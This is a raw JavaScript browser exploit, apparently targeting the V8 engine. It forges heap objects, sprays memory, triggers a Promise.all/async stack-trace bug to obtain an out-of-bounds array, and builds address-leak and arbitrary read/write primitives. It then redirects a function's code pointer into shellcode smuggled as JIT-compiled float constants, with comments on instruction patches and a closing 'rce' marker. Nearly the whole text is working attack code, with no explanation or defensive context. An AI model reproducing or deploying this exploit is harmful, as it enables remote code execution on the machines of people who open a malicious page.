<script>
    const fake_obj_str =
"\x11\x31\x24\x00\x61\x22\x00\x00\
\xb5\x23\x68\x00\x00\x08\x00\x00\
\xd5\x63\x00\x00\x00\x00\x00\x00\
\xe9\x23\x00\x00\x41\x30\x4a\x00\
\xe9\x23\x00\x00\xe9\x23\x00\x00\
\x29\x23\x24\x00\x61\x22\x00\x00\
\x61\x22\x00\x00\xf1\xe9\x14\x00\
\x61\x30\x4a\x00\x19\xd8\x14\x00\
\x39\xf9\x1c\x00\x00\x00\x00\x00\
\xf9\x48\x24\x00\x06\x00\x00\x00\
\x61\x36\x00\x00\x61\x36\x00\x00\
\x79\x30\x4a\x00\x00\x00\x00\x00\
\xc9\x41\x24\x00\x61\x22\x00\x00\
\x61\x22\x00\x00\x95\x24\x68\x00\
\x71\x34\x4a\x00\x19\x30\x4a\x00\
\x18\x01\x00\x00\x00\x00\x00\x00\
\x00\x00\x00\x00\x23\x23\x23\x23"; // 0x88

  
    // fake_objs = [
    //   /* +0x0 */ p64f(0x00243111, 0x00002261), // OOB array
    //   /* +0x8 */ p64f(oob_arr_draft_elem_addr, 0x800), // 0001e4719
    //   /* +0x10 */ p64f(0x000063d5, 0x00000000), // PromiseReaction  // 0x004fb35
    //   /* +0x18 */ p64f(0x000023e9, fake_objs_elems_addr + 0x28),
    //   /* +0x20 */ p64f(0x000023e9, 0x000023e9), // ?
    //   /* +0x28 */ p64f(0x00242329, 0x00002261), // Function
    //   /* +0x30 */ p64f(0x00002261, 0x0014e9f1), 
    //   /* +0x38 */ p64f(fake_objs_elems_addr + 0x48, 0x0014d819),
    //   /* +0x40 */ p64f(0x001cf939, 0x0),
    //   /* +0x48 */ p64f(0x002448f9, 0x00000006), // Context
    //   /* +0x50 */ p64f(0x00003661, 0x00003661),
    //   /* +0x58 */ p64f(fake_objs_elems_addr + 0x60, 0x0),
    //   /* +0x60 */ p64f(0x002441c9, 0x00002261), // JSGeneratorObject
    //   /* +0x68 */ p64f(0x00002261, sloppy_func_addr),
    //   /* +0x70 */ p64f(0x004a3471, fake_objs_elems_addr),
    //   /* +0x78 */ p64f(0x00000118, 0x00000000),
    //   /* +0x80 */ p64f(0x00000000, 0x23232323),
    // ];
  
    const shell_code_foo = () => {
        return [
            1.0,
            1.97128800932264e-246,
            1.9710251538487089e-246,//占位1 20
            1.9535165331756856e-246,
            1.9711831786218553e-246,
            1.9711302582276649e-246,//mov rdx,rdx+60h，这一行后面加一个mov rdx,rdx+18h
            1.971182386370243e-246,//增加完毕
            1.9711824204694007e-246,//替换qword from dword
            1.971182625597146e-246,
            1.9711062190503973e-246,
            1.9844872658808452e-246,
            1.9710442338776101e-246,//占位2 200
            1.9346517240445797e-246,
            1.9539187092919419e-246,//占位3 240
            1.9398291100944961e-246,
            1.9889043320213015e-246,
            5.4347192807448249e-232,//需要更换跳转到+3的位置 300
            5.5483866078232455e-232,//test rax, rax 占位4 323
            5.4347193054904659e-232,
            5.5483858407041602e-232,
            5.548386599938718e-232,
            5.5483852580972086e-232,
            5.5483866085489296e-232,
            5.5483866082450352e-232,//占位5替换指令 test   rcx,rcx 461
            5.4347192989761578e-232,
            5.5483866082673696e-232,
            5.5483865052825693e-232,
            5.5929115874408499e-232,
            5.5483869437399541e-232,
            5.5483850365737534e-232,
            5.548386607845941e-232,
            5.5483866055903481e-232,//占位6替换指令：622 cmp al,ah
            5.5483866055790415e-232,
            5.5479675990708206e-232,
            5.5483866086060441e-232,//占位7：691
            5.6360051602057723e-232,
            5.5483866055757255e-232,
            5.5483853060875066e-232,
            5.5485814548559491e-232,
            5.5481638823537202e-232,
            5.5483852101069105e-232,
            5.5483873667057662e-232,
            5.548386503033024e-232,
            5.5482136635123504e-232,
            5.5482200888855405e-232,
            5.5056845587187283e-232,
            5.4993936985335533e-232,
            5.5057579849776769e-232,
            5.5483865996697425e-232,
            5.5487288654373309e-232,//占位8 1059
            5.548387392950241e-232,
            5.5483866079393109e-232,
            5.5479425928198922e-232,// lea     rcx,[rbp+0x57a]
            5.5483866055757276e-232,
            5.5479429440804607e-232,
            5.5412087282453567e-232,
            5.5483866055884766e-232,
            5.5482086832973947e-232,
            5.5587464282218089e-232,
            5.4667737614685567e-232,
            5.5483856568047451e-232,//占位9 1289
            5.5480699333653622e-232,//占位10 
            5.5482848842675359e-232,
            5.6065483607039769e-232,
            5.5483866088298074e-232,//mov movsxd替换 1381
            9.5545979395580963e-307
        ];
    }
  
    const f_x = () => 123;
    // elements: 0x4e5c5
  
    // addrOf: 0x4e655
    for (let i = 0; i < 0x3000; i++) {
        shell_code_foo(); shell_code_foo(); shell_code_foo(); shell_code_foo();
        shell_code_foo(); shell_code_foo(); shell_code_foo(); shell_code_foo();
    }
  
    var arb = new ArrayBuffer(0x100);
    // const jspromise = [
    //   p64f(0x0, 0x002030c1 << 8),
    //   p64f(0x00002261 << 8, 0x00002261 << 8),
    //   p64f((fake_objs_elems_addr + 0x18) << 8, 0x0),
    // ];
    var ref = new Array(0x1000000);
  
    function js_promise_spray() {
        let x = [5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134,
5.111803580865668e-308,2.361809483059676e+49,2.9284565528116464e-134
        ];
        // %DebugPrint(x);
        // alert(x.length);
        // %SystemBreak();
        ref.push(x);
    }
  
    for (let i = 0; i < 0x10000; i++) {
        js_promise_spray();
    }
    gc();
    var debug_ref = [];
    var buf = new ArrayBuffer(16);
    var f64 = new Float64Array(buf);
    var u32 = new Uint32Array(buf);
    var buf1 = new ArrayBuffer(0x400);
    var dataview1 = new DataView(buf1);
    var dv = new DataView(buf);
  
    function p64f(low, high) {
        dv.setUint32(0, low, true);
        dv.setUint32(4, high, true);
        return dv.getFloat64(0, true);
    }
  
    function smi(i) {
        return i << 1n;
    }
  
    function ftoi(val) {
        dv.setFloat64(0, val, true);
        return dv.getBigUint64(0, true);
    }
  
    function itof(val) {
        dv.setBigUint64(0, BigInt(val), true);
        return dv.getFloat64(0, true);
    }
  
    function f2half(f) {
        f64[0] = f;
        let tmp = Array.from(u32);
        return tmp;
    }
  
    function half2f(val) {
        u32.set(val);
        return f64[0];
    }
  
    function hex(i) {
        return "0x" + i.toString(16).padStart(16, "0");
    }
  
    function d2u(v) {
        f64[0] = v;
        return u32;
    }
  
    function gc() {
        new ArrayBuffer(0x7fe00000);
    }
    
    const sloppy_func_addr = 0x1e46dd;
    const fake_objs_elems_addr = 0x2b53ad; // 0x311f55
    const thehole_addr = fake_objs_elems_addr;
    ///////
    debug_ref.push(ref);

    const mark_obj = {mark:0x13371337,mark1:0x1717dead};
  
    var oob_arr_draft = [2.1,];
    gc();
    gc();
    var addrOf_dict = [{}, {}, 1.1];
    gc();
    gc();
    var aarw_arr = [1.1,3.3];
    gc();
    gc();
    const sloppy_func = () => { };
    gc();
    gc();
    // %DebugPrint(mark_obj);
    // %DebugPrint(oob_arr_draft);
    // %DebugPrint(addrOf_dict);
    // %DebugPrint(aarw_arr);
    // %DebugPrint(fake_obj_str);
    // %DebugPrint(sloppy_func);
    //alert("dbg");
    var oob_arr;
  
    function addrOf(obj) {
        addrOf_dict[1] = obj;
        return ftoi(oob_arr[0x40 / 8]);
    }
  
    function arbRead(addr) {
        oob_arr[0xb0 / 8] = itof(((addr | 1n) - 8n) | (0x00000010n) << 32n);
        return ftoi(aarw_arr[0]);
    }
  
    function arbWrite(addr, data) {
        oob_arr[0xb0 / 8] = itof(((addr | 1n) - 8n) | (0x00000010n) << 32n);
        aarw_arr[0] = itof(data);
    }
  
    Error.prepareStackTrace = function (error, frames) {
  
        if (frames.length < 3) {
            console.error("No fake async stack frame");
        } else {
            console.error("I GOT MY FAKE ASYNC STACK FRAME");
            // %DebugPrint(frames[2]);
            oob_arr = frames[2].getThis();
        }
    };
  
    /////////////// Trigger the bug ///////////////
  
    var closure;
  
    function Constructor(executor) {
        executor(() => { }, () => { });
    }
    Constructor.resolve = function (v) {
        return v;
    };
  
    let p1 = {
        then(onFul, onRej) {
            closure = onFul;
            closure(1);
        }
    };
  
    async function boo(x) {
        await bar(x).then(closure);
    }
  
    async function bar(x) {
        await x;
        throw new Error("Let's have a look...");
    }
  
    async function foo() {
  
        await Promise.all.call(Constructor, [p1]);
        boo(1).catch(e => {
            e.stack;
            if (oob_arr == undefined) {
                console.error("oob fail");
                throw "done.";
            }
            console.info("=============OOB SUCCESS============");
            alert("[+]oob arr lenghth :" + hex(oob_arr.length));
            var foo_addr = addrOf(shell_code_foo) & 0xffffffffn;
            alert("[+]foo addr :" + hex(foo_addr));
            // %DebugPrint(oob_arr_draft);
            // %DebugPrint(addrOf_dict);
            // %DebugPrint(aarw_arr);
            // %DebugPrint(shell_code_foo);
            // %DebugPrint(oob_arr);
            var code_addr = arbRead(foo_addr + 0x18n) & 0xffffffffn;
            alert("[+]code addr : " + hex(code_addr));
  
            var jit_addr = arbRead(code_addr + 0x7n);
            alert("[+]jit code addr : " + hex(jit_addr));
            var f_x_addr = addrOf(f_x) & 0xffffffffn;
            alert("[+]f_x_addr : " + hex(f_x_addr));
            var f_x_code_addr = arbRead(f_x_addr + 0x18n) & 0xffffffffn;
            alert("[+]f_x_code_addr : " + hex(f_x_code_addr));
            // %SystemBreak();
            arbWrite(f_x_code_addr + 0x7n + 0x8n, jit_addr + 0xb3n + 0x6n);
            // f_x();
        });
    }
  
    foo();
  
    // rce
  
  
  </script>
